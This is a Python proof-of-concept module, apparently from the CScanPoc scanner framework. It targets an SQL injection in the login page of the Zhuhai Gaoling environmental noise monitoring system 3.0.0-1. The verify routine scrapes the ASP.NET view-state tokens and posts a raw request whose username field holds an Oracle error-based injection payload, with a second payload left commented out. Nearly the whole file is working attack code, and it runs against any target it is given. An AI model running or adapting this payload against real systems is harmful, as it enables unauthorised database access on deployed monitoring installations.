# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib

class Vuln(ABVuln):
    vuln_id = 'Huanjingjiance_0001' # 平台漏洞编号，留空
    name = '珠海高凌环境监测系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-09-24'  # 漏洞公布时间
    desc = '''
        珠海高凌环境噪声自动监测系统3.0.0-1 参数过滤不严谨，造成SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '珠海高凌环境监测系统'  # 漏洞应用名称
    product_version = '3.0.0-1'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '44b177ca-f05b-4b34-bfbf-847cd6e09458'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh =hackhttp.hackhttp()
            preWork = self.target + '/Portal/Login.aspx'
            code, head, res, errcode, _ = hh.http(preWork)
            if code != 200:
                return
            patten = re.findall(r'value=\"(?P<aa>[\w\+\/\=]{1,}?)\"',res)
            if patten:
                p1 = urllib.quote(patten[0])
                p2 = urllib.quote(patten[1])
                raw = '''
POST /Portal/Login.aspx HTTP/1.1
Host: 127.0.0.1
Proxy-Connection: keep-alive
Content-Length: 407
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
Content-Type: application/x-www-form-urlencoded

__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='''+p1+'''&__EVENTVALIDATION='''+p2+'''&username=admin' AND 8270=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(116)||CHR(101)||CHR(115)||CHR(116)||CHR(118)||CHR(117)||CHR(108))) FROM DUAL) AND 'aaa'='aaa&password=admin&btnSubmit=
    '''
    #payload = '''__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='''+p1+'''&__EVENTVALIDATION='''+p2+'''&username=admin' AND 8270=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(98)||CHR(117)||CHR(103)||CHR(115)||CHR(99)||CHR(97) ||CHR(110))) FROM DUAL) AND 'aaa'='aaa&password=admin&btnSubmit='''
    #print '-d "'+payload+'" '+preWork
                code, head, res, errcode, _ = hh.http(preWork, raw=raw)
                if code == 200 and "testvul" in res:
                    #security_hole(preWork)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
